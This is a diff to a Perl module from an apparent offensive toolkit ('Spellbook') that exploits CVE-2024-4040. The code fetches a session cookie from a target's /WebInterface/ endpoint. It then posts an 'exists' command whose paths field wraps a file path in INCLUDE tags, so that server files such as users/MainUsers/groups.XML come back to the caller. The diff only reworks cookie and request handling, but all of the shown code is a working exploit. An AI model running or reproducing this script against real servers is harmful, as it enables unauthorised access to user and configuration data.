@@ -3,10 +3,12 @@ package Spellbook::Advisory::CVE_2024_4040 {
     use warnings;
     use Getopt::Long;
     use Spellbook::Core::UserAgent;
+    use HTTP::Cookies;
 
     sub new {
         my ($self, $parameters) = @_;
         my ($target, $help, @result);
+
         my $payload = "users/MainUsers/groups.XML";
 
         Getopt::Long::GetOptionsFromArray (
@@ -15,28 +17,32 @@ package Spellbook::Advisory::CVE_2024_4040 {
             "payload=s" => \$payload,
             "help"      => \$help
         );
-        
+    
         if ($target) {
             if ($target !~ /^http(s)?:\/\//) {
                 $target = "https://$target";
             }
+            
+            my $endpoint   = "$target/WebInterface/";
+            my $userAgent  = Spellbook::Core::UserAgent -> new();
+            my $cookie_jar = HTTP::Cookies -> new();
+            
+            $userAgent -> cookie_jar($cookie_jar);
+            
+            my $response = $userAgent -> post($endpoint);
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $endpoint  = "$target/WebInterface/";
-            my $response  = $userAgent -> post($endpoint);
-            my $cookies   = $response -> headers -> header("Set-Cookie");
+            $cookie_jar -> extract_cookies($response);
+            $cookie_jar -> save();
 
-            if ($cookies =~ /currentAuth=([^;]+)/) {
-                my $data = {
-                    'command' => 'exists',
-                    'paths'   => "<INCLUDE>$payload</INCLUDE>",
-                    'c2f'     => $1,
-                };
+            my $cookies = $response -> header("Set-Cookie");
 
-                $userAgent -> post($endpoint => form => $data);
-                $response = $userAgent -> post($endpoint => form => $data);
-
-                push @result, $response -> content();
+            if ($cookies =~ /currentAuth=([^;]+)/) {                
+                $response = $userAgent -> post($endpoint, 
+                    Content_Type => "application/x-www-form-urlencoded", 
+                    Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
+                );
+                
+                push @result, $response -> decoded_content();
             }
 
             return @result;
@@ -53,6 +59,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
 
         return 0;
     }
+
 }
 
 1;
